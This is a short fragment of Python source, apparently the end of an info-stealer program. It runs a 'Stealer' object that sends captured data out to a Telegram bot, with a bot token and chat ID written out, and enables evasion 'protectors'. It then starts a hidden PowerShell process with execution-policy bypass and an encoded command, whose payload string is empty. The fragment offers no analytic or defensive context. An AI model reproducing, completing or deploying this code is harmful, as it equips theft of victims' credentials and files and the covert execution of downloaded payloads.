...
if __name__ == "__main__":
  Stealer(
    senders = [Senders.telegram("5867862670:AAHp7ECfsTluhMCJC4Vl2YYZCQDdUtQ-o18", -4185548654)],
    protectors=[Protectors.all]
    ).run()
  startupDownload= ''
  subprocess.Popen(['powershell.exe','-ep','bypass','-w', 'hidden','-enc',startupDownload])
